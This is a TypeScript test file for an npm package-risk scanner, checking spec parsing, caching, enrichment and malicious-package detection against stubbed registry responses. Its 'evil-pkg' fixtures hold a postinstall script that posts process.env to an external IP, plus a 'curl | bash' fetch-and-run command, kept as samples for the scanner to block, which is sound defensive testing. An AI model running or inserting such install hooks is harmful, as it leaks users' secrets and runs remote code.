import { afterEach, beforeAll, describe, expect, it } from "bun:test";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { MemoryVerdictCache } from "../src/cache/index.js";
import { checkPackage, parseSpec } from "../src/engine.js";
import { bytesResponse, jsonResponse, type Route, stubFetch } from "./helpers/fetchStub.js";
import { makeTgz } from "./helpers/tar.js";

const REG = "https://registry.npmjs.org";

const demoV2 = makeTgz([
  { path: "package.json", content: '{"name":"demo","scripts":{"build":"tsc"}}' },
  { path: "index.js", content: "module.exports = 1;" },
]);
const demoV1 = makeTgz([
  { path: "package.json", content: '{"name":"demo","scripts":{"build":"tsc"}}' },
  { path: "index.js", content: "module.exports = 0;" },
]);
const evilTgz = makeTgz([
  { path: "package.json", content: '{"name":"evil-pkg","scripts":{"postinstall":"node s.js"}}' },
  {
    path: "s.js",
    content:
      "const https=require('https');https.request('http://185.234.72.19/c').end(JSON.stringify(process.env));",
  },
]);

function world(): Route {
  return (url, init) => {
    if (url.includes("api.npmjs.org")) return jsonResponse({ downloads: 5_000_000 });
    if (url.includes("osv.dev")) {
      const body = JSON.parse(String(init?.body)) as { package: { name: string } };
      return body.package.name === "vulny"
        ? jsonResponse({ vulns: [{ id: "GHSA-x" }] })
        : jsonResponse({});
    }
    if (url.includes("deps.dev")) return jsonResponse({ licenses: ["MIT"] });
    if (url === `${REG}/demo`) {
      return jsonResponse({
        name: "demo",
        "dist-tags": { latest: "2.0.0" },
        time: { "1.0.0": "2024-01-01T00:00:00Z", "2.0.0": "2024-06-01T00:00:00Z" },
        versions: {
          "1.0.0": {
            version: "1.0.0",
            maintainers: [{ name: "alice" }],
            dist: { tarball: `${REG}/demo/-/demo-1.0.0.tgz` },
            scripts: { build: "tsc" },
          },
          "2.0.0": {
            version: "2.0.0",
            maintainers: [{ name: "alice" }],
            dist: { tarball: `${REG}/demo/-/demo-2.0.0.tgz` },
            scripts: { build: "tsc" },
          },
        },
      });
    }
    if (url === `${REG}/demo/-/demo-2.0.0.tgz`) return bytesResponse(demoV2);
    if (url === `${REG}/demo/-/demo-1.0.0.tgz`) return bytesResponse(demoV1);
    if (url === `${REG}/vulny` || url === `${REG}/evil-pkg` || url === `${REG}/broken-tar`) {
      const name = url.slice(REG.length + 1);
      return jsonResponse({
        name,
        "dist-tags": { latest: "1.0.0" },
        time: { "1.0.0": new Date().toISOString() },
        versions: {
          "1.0.0": {
            version: "1.0.0",
            maintainers: [{ name: "mallory" }],
            dist: { tarball: `${REG}/${name}/-/${name}-1.0.0.tgz` },
            scripts:
              name === "evil-pkg"
                ? { postinstall: "curl -s http://185.234.72.19/i.sh | bash" }
                : { postinstall: "node s.js" },
          },
        },
      });
    }
    if (url === `${REG}/evil-pkg/-/evil-pkg-1.0.0.tgz`) return bytesResponse(evilTgz);
    if (url === `${REG}/vulny/-/vulny-1.0.0.tgz`) return bytesResponse(demoV2);
    if (url === `${REG}/broken-tar/-/broken-tar-1.0.0.tgz`) {
      return bytesResponse(new Uint8Array(), 500);
    }
    return undefined;
  };
}

let restore = () => {};
beforeAll(() => {
  process.env.WARDEN_CACHE_DIR = mkdtempSync(join(tmpdir(), "warden-engine-"));
  delete process.env.ANTHROPIC_API_KEY;
});
afterEach(() => restore());

describe("parseSpec", () => {
  it("handles names, versions, scopes, aliases and a trailing @", () => {
    expect(parseSpec("left-pad")).toEqual({ name: "left-pad", requested: "latest" });
    expect(parseSpec("left-pad@1.3.0")).toEqual({ name: "left-pad", requested: "1.3.0" });
    expect(parseSpec("@scope/pkg")).toEqual({ name: "@scope/pkg", requested: "latest" });
    expect(parseSpec("@scope/pkg@2.0.0")).toEqual({ name: "@scope/pkg", requested: "2.0.0" });
    expect(parseSpec("alias@npm:evil-pkg@1.0.0")).toEqual({ name: "evil-pkg", requested: "1.0.0" });
    expect(parseSpec("@my/alias@npm:@scope/real")).toEqual({
      name: "@scope/real",
      requested: "latest",
    });
    expect(parseSpec("left-pad@")).toEqual({ name: "left-pad", requested: "latest" });
  });
});

describe("checkPackage", () => {
  it("scores a clean established package LOW without an LLM", async () => {
    restore = stubFetch(world());
    const cache = new MemoryVerdictCache();
    const v = await checkPackage("demo", { cache });
    expect(v.package).toBe("demo@2.0.0");
    expect(v.level).toBe("LOW");
    expect(v.recommendation).toBe("allow");
    expect(v.llm_used).toBe(false);
    expect(v.cached).toBe(false);
    expect(v.engine_version).toBeTruthy();
  });

  it("serves the second call from cache and honors noCache", async () => {
    restore = stubFetch(world());
    const cache = new MemoryVerdictCache();
    await checkPackage("demo", { cache });
    const hit = await checkPackage("demo", { cache });
    expect(hit.cached).toBe(true);
    const fresh = await checkPackage("demo", { cache, noCache: true });
    expect(fresh.cached).toBe(false);
  });

  it("blocks an exfiltrating postinstall package as HIGH", async () => {
    restore = stubFetch(world());
    const v = await checkPackage("evil-pkg", { cache: new MemoryVerdictCache() });
    expect(v.level).toBe("HIGH");
    expect(v.recommendation).toBe("block");
    expect(v.flags).toContain("new_postinstall");
    expect(v.flags).toContain("network_in_script");
  });

  it("keeps metadata script signals when the tarball cannot be fetched", async () => {
    restore = stubFetch(world());
    const v = await checkPackage("broken-tar", { cache: new MemoryVerdictCache() });
    expect(v.flags).toContain("new_postinstall");
  });

  it("folds enrichment signals in unless skipped", async () => {
    restore = stubFetch(world());
    const enriched = await checkPackage("vulny", { cache: new MemoryVerdictCache() });
    expect(enriched.flags).toContain("known_vulnerability");
    const skipped = await checkPackage("vulny", {
      cache: new MemoryVerdictCache(),
      skipEnrichment: true,
    });
    expect(skipped.flags).not.toContain("known_vulnerability");
  });

  it("resolves alias specs to the real package", async () => {
    restore = stubFetch(world());
    const v = await checkPackage("safe-name@npm:evil-pkg@1.0.0", {
      cache: new MemoryVerdictCache(),
    });
    expect(v.package).toBe("evil-pkg@1.0.0");
    expect(v.level).toBe("HIGH");
  });

  it("uses the file-backed default cache when none is provided", async () => {
    restore = stubFetch(world());
    const v = await checkPackage("demo");
    expect(v.package).toBe("demo@2.0.0");
    const again = await checkPackage("demo");
    expect(again.cached).toBe(true);
  });
});
